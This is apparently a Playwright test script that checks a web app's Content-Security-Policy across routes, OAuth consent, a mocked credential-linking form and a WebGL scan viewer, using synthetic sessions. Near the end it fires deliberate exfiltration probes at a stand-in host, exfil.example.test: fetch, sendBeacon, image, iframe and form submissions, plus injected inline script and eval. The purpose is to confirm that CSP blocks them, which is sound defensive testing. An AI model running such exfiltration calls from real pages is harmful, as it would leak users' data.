// Build with https://api.example.test and https://auth.example.test, then serve
// dist under the generated nginx config. CSP_QA_MODULES points to a temporary
// package.json with Playwright installed, as in fantasy-motion.mjs.
import { createRequire } from 'node:module';
import { mkdir, writeFile } from 'node:fs/promises';
import assert from 'node:assert/strict';
import { zipSync } from 'three/addons/libs/fflate.module.js';
import { SNAPSHOT_V2 } from '../src/fantasy/fixture.js';
const require = createRequire(process.env.CSP_QA_MODULES || import.meta.url);
const { chromium } = require('playwright');
const server = process.env.CSP_QA_URL || 'http://127.0.0.1:8096';
assert(['localhost', '127.0.0.1', '[::1]'].includes(new URL(server).hostname), 'QA server must be loopback');
const origin = 'https://commons.example.test';
const output = process.env.CSP_QA_OUTPUT || 'artifacts/csp';
await mkdir(output, { recursive: true });
const browser = await chromium.launch({ channel: 'chrome', headless: true });
const results = [];
const unexpected = [];
const expires = Math.floor(Date.now() / 1000) + 3600;
const user = { id: '10000000-0000-4000-8000-000000000001', email: 'csp@example.test', user_metadata: { full_name: 'Synthetic CSP', avatar_url: 'https://untrusted.example/photo' } };
const profile = { user_id: user.id, display_name: 'Synthetic CSP', avatar_url: user.user_metadata.avatar_url, email: user.email };
const token = [Buffer.from('{"alg":"HS256"}').toString('base64url'), Buffer.from(JSON.stringify({ sub: user.id, exp: expires })).toString('base64url'), 'synthetic'].join('.');
const session = { access_token: token, refresh_token: 'synthetic', expires_at: expires, expires_in: 3600, token_type: 'bearer', user };
const authDetails = { authorization_id: 'synthetic', client: { id: 'synthetic-client', name: 'Synthetic agent' }, user, scope: 'openid commons:read', redirect_uri: 'https://callback.example.test/complete' };
const submissions = [];
try {
  const account = await fetch(`${server}/account`);
  const strictPolicy = account.headers.get('content-security-policy');
  assert.doesNotMatch(strictPolicy, /img-src[^;]*https: /);
  assert.equal(account.headers.get('cache-control'), 'no-cache');
  const cached = await fetch(`${server}/account`, { headers: { 'If-None-Match': account.headers.get('etag') } });
  assert.equal(cached.status, 304);
  assert.equal(cached.headers.get('content-security-policy'), strictPolicy);
  assert.equal(cached.headers.get('cache-control'), 'no-cache');
  const missing = await fetch(`${server}/assets/missing-12345678.js`);
  assert.equal(missing.status, 404);
  assert(missing.headers.get('content-security-policy'));
  assert(!missing.headers.get('cache-control')?.includes('immutable'));
  results.push({ flow: 'nginx strict 200/304 and asset 404 headers', passed: true });
  for (const signedIn of [false, true]) {
    const context = await browser.newContext({ viewport: { width: 390, height: 844 } });
    await context.addInitScript(({ signedIn, session }) => {
      window.cspViolations = [];
      document.addEventListener('securitypolicyviolation', e => window.cspViolations.push({ directive: e.effectiveDirective, blocked: e.blockedURI }));
      if (signedIn) localStorage.setItem('sb-auth-auth-token', JSON.stringify(session));
    }, { signedIn, session });
    await context.route('**/*', async route => {
      const url = new URL(route.request().url());
      if (url.origin === origin && url.pathname === '/csp-eval-fixture.js') return route.fulfill({ contentType: 'application/javascript', body: "try { eval('window.evalRan = true'); } catch { window.evalBlocked = true; }" });
      if (url.origin === origin && !url.pathname.startsWith('/crowdset/sets')) {
        // Fetch actual nginx bytes/headers; the synthetic HTTPS origin exercises
        // production Crowdset behavior without real DNS or production traffic.
        const response = await context.request.get(`${server}${url.pathname}${url.search}`);
        return route.fulfill({ response });
      }
      if (url.origin === 'https://api.example.test') {
        const path = url.pathname;
        if (path === '/account/linked-accounts/beli') {
          submissions.push(route.request().postDataJSON());
          return route.fulfill({ json: { account: { connected: true } } });
        }
        const json = path === '/account' ? profile : path === '/account/linked-accounts' ? {}
          : path === '/floor-planner/plans' ? { mine: [], shared: [], public: [] }
            : path.includes('/predictions/latest') ? SNAPSHOT_V2 : path === '/dice/profile/me' ? profile : [];
        return route.fulfill({ json });
      }
      if (url.origin === 'https://auth.example.test') {
        if (url.pathname.endsWith('/consent')) return route.fulfill({ json: { redirect_url: 'https://callback.example.test/complete' } });
        if (url.pathname.includes('/oauth/authorizations/')) return route.fulfill({ json: authDetails });
        return route.fulfill({ json: url.pathname.endsWith('/user') ? user : [] });
      }
      if (url.origin === origin && url.pathname.startsWith('/crowdset/sets')) return route.fulfill({ json: [] });
      if (url.origin === 'https://callback.example.test') return route.fulfill({ contentType: 'text/plain', body: 'Synthetic callback' });
      if (['fonts.googleapis.com', 'fonts.gstatic.com'].includes(url.hostname)) return route.continue();
      if (['a.espncdn.com', 'g.espncdn.com', 'untrusted.example', 'lh3.googleusercontent.com'].includes(url.hostname)) {
        return route.fulfill({ contentType: 'image/svg+xml', body: '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>' });
      }
      unexpected.push(url.href);
      return route.abort();
    });
    const page = await context.newPage();
    let consoleCsp = [];
    page.on('console', message => { if (/content security policy|violates.*directive/i.test(message.text())) consoleCsp.push(message.text()); });
    const routes = ['/', '/admin', '/dice', '/trips', '/floor-planner', '/connect', '/account', '/oauth/consent?authorization_id=synthetic', '/fantasy', '/crowdset', '/crowd-set', '/design', '/design/dice', '/ACCOUNT/', '/%61ccount', '/oauth/consent/'];
    for (const path of routes) {
      consoleCsp = [];
      const response = await page.goto(`${origin}${path}`);
      await page.waitForTimeout(800);
      assert.equal(response.status(), 200, path);
      assert.match(response.headers()['content-security-policy'], /default-src 'self'/, path);
      assert.equal(await page.locator('#root').innerText().then(x => x.trim().length > 0), true, `Empty route: ${path}`);
      const violations = await page.evaluate(() => window.cspViolations);
      assert.deepEqual(violations, [], `${path}: ${JSON.stringify(violations)}`);
      assert.deepEqual(consoleCsp, [], `${path}: ${consoleCsp.join('\n')}`);
      results.push({ path, signedIn, violations, text: (await page.locator('#root').innerText()).slice(0, 120) });
    }
    if (signedIn) {
      await page.goto(`${origin}/account#beli`);
      await page.getByLabel('Beli email or phone').fill('synthetic@example.test');
      await page.getByLabel('Beli password', { exact: true }).fill('synthetic-password');
      await page.getByRole('button', { name: 'Connect Beli' }).click();
      await page.getByText('Connected', { exact: true }).waitFor();
      assert.deepEqual(submissions, [{ login: 'synthetic@example.test', password: 'synthetic-password' }]);
      assert.deepEqual(await page.evaluate(() => window.cspViolations), []);
      results.push({ flow: 'synthetic Beli submit', passed: true });
      // Exercise actual React Links entering and leaving the stricter document.
      await page.getByRole('link', { name: 'Cozy Commons home' }).click();
      await page.waitForURL(`${origin}/`);
      await page.getByRole('button', { name: 'Account: Synthetic CSP' }).click();
      const navigation = page.waitForResponse(r => r.request().isNavigationRequest() && new URL(r.url()).pathname === '/account');
      await page.getByRole('link', { name: 'Your profile' }).click();
      const accountResponse = await navigation;
      assert.doesNotMatch(accountResponse.headers()['content-security-policy'], /img-src[^;]*https: /);
      await page.getByRole('heading', { name: 'Your account' }).waitFor();
      await page.goBack();
      await page.waitForURL(`${origin}/`);
      await page.goForward().catch(error => { if (!error.message.includes('ERR_ABORTED')) throw error; });
      await page.getByRole('heading', { name: 'Your account' }).waitFor();
      results.push({ flow: 'React Link and history policy boundary', passed: true });
      for (const button of ['Allow connection', 'Deny']) {
        await page.goto(`${origin}/oauth/consent?authorization_id=synthetic`);
        await page.getByRole('button', { name: button, exact: true }).click();
        await page.waitForURL('https://callback.example.test/complete');
        results.push({ flow: `OAuth ${button}`, passed: true });
      }
    }
    await page.goto(`${origin}/floor-planner`);
    const archive = zipSync({ 'root.usda': new TextEncoder().encode('#usda 1.0\ndef Mesh "Wall" {\n point3f[] points = [(0,0,0), (3,0,0), (3,2,0), (0,2,0)]\n int[] faceVertexCounts = [4]\n int[] faceVertexIndices = [0,1,2,3]\n}\n') });
    await page.evaluate(async bytes => {
      const manifest = await fetch('/.vite/manifest.json').then(r => r.json());
      const chunk = Object.values(manifest).find(value => value.file.includes('/scanRenderer-'));
      const module = await import(`/${chunk.file}`);
      const container = document.createElement('div');
      container.style.cssText = 'width:300px;height:300px'; document.body.append(container);
      const errors = [];
      const view = await Object.values(module)[0](container, new Uint8Array(bytes).buffer, error => errors.push(error.message));
      await new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)));
      if (!container.querySelector('canvas') || errors.length) throw new Error(`Scan failed: ${errors}`);
      view.dispose(); container.remove();
      const image = new Image(); image.src = URL.createObjectURL(new Blob(['<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>'], { type: 'image/svg+xml' }));
      await image.decode(); URL.revokeObjectURL(image.src);
    }, [...archive]);
    assert.deepEqual(await page.evaluate(() => window.cspViolations), []);
    results.push({ signedIn, flow: 'built Three.js USDZ/WebGL and blob image', passed: true });
    await page.goto(`${origin}/account`);
    await page.waitForTimeout(500);
    await page.evaluate(async () => {
      window.cspViolations = [];
      for (const url of ['https://exfil.example.test/password', 'https://api.example.test/track/events', 'https://auth.example.test/rest/v1/leak', '/crowdset/sets']) await fetch(url).catch(() => {});
      const evaluator = document.createElement('script'); evaluator.src = '/csp-eval-fixture.js'; document.body.append(evaluator);
      navigator.sendBeacon('https://exfil.example.test/beacon', 'synthetic');
      const script = document.createElement('script'); script.textContent = 'window.injectedScriptRan = true'; document.body.append(script);
      const img = new Image(); img.src = 'https://exfil.example.test/password'; document.body.append(img);
      const frame = document.createElement('iframe'); frame.src = 'https://exfil.example.test/password'; document.body.append(frame);
      const form = document.createElement('form'); form.action = 'https://exfil.example.test/password'; document.body.append(form); form.submit();
    });
    await page.waitForTimeout(200);
    const blocked = await page.evaluate(() => ({ violations: window.cspViolations, scriptRan: !!window.injectedScriptRan, evalBlocked: window.evalBlocked, evalRan: !!window.evalRan }));
    for (const directive of ['connect-src', 'script-src-elem', 'img-src', 'frame-src', 'form-action']) assert(blocked.violations.some(x => x.directive === directive), `Missing blocked ${directive}`);
    assert.equal(blocked.scriptRan, false);
    assert.equal(blocked.evalRan, false);
    assert.equal(blocked.evalBlocked, true);
    results.push({ signedIn, flow: 'intentional exfiltration probes', ...blocked });
    await context.close();
  }
  assert.deepEqual(unexpected, [], 'Unexpected external requests');
} finally {
  await writeFile(`${output}/browser-results.json`, JSON.stringify({ results, unexpected }, null, 2));
  await browser.close();
}
console.log(`Passed ${results.length} route/flow checks; results: ${output}/browser-results.json`);
